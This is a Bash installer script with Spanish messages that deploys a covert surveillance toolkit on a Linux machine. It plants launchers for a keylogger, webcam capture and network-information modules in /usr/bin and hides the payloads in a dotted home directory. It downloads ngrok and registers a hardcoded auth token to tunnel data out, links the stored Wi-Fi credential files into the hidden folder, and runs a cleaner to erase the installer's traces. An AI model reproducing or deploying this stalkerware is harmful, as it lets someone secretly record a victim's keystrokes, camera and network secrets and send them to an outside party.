#!/bin/bash

root_verify=$(whoami)
usuario=$(users)

function init_program() {
    sudo touch /usr/bin/observer.sh
    sudo touch /usr/bin/chisec.sh
    sudo touch /usr/bin/fingerstalker.sh
    sudo touch /usr/bin/netinfo.sh
    sudo touch /usr/bin/bamby.sh
    sudo echo "python3.7 /home/$usuario/.v1kox/0v53rber/cam_snap.py" > /usr/bin/observer.sh
    sudo echo "python3.7 /home/$usuario/.v1kox/ch1s3c/hb.py" > /usr/bin/chisec.sh
    sudo echo "python3.7 /home/$usuario/.v1kox/f1ng3r5talk3r/keylogger.py" > /usr/bin/fingerstalker.sh
    sudo echo "python3.7 /home/$usuario/.v1kox/n3t1nfo/netinfo.py" > /usr/bin/netinfo.sh
    sudo echo "/home/$usuario/.v1kox/bamby/./bamby.sh && sleep 10 && python3.7 /home/$usuario/.v1kox/b4mby/bamby.py" > /usr/bin/bamby.sh
    sudo chmod +x /usr/bin/observer.sh
    sudo chmod +x /usr/bin/chisec.sh
    sudo chmod +x /usr/bin/fingerstalker.sh
    sudo chmod +x /usr/bin/netinfo.sh
    sudo chmod +x /usr/bin/bamby.sh
    sudo chmod +x /home/$usuario/.v1kox/b4mby/bamby.sh

    email=$1
    machine=$2
    
    echo "$email|$machine|$usuario" > exploits/config.txt

    # Carpetas
    mkdir ../.v1kox
    mv exploits/cleaner.sh ../.v1kox && sudo chmod ../.v1kox/cleaner.sh
    mv exploits/config.txt ../.v1kox
    mv exploits/0v53rber/ ../.v1kox
    mv exploits/ch1s3c/ ../.v1kox
    mv exploits/f1ng3r5talk3r/ ../.v1kox
    mv exploits/n3t1nfo/ ../.v1kox
    mv exploits/b4mby/ ../.v1kox
    sudo mv exploits/config.txt /usr/bin/
    cd ../.v1kox && wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz && tar -xf ngrok-v3-stable-linux-amd64.tgz && rm ngrok-v3-stable-linux-amd64.tgz && chmod +x ngrok && ./ngrok config add-authtoken 2HVxiT0TNhWg7cqgjyW6o6i3Kvd_7QWwyBiG2Vc3AQX5fYU6K

    clear

    ln -s /etc/NetworkManager/system-connections /home/$usuario/.v1k0x/
    chmod +x /home/$usuario/v1k0x/add.sh
    /home/$usuario/v1k0x/./add.sh
    echo -e "[+] Instalacion completada con exito."
    
    sudo ../.v1kox/./cleaner.sh $(pwd)
}

if [ $root_verify != "root" ]
then
    echo -e "[!] Debes ejecutar el instalador como root (super-usuario)"
else
    init_program
fi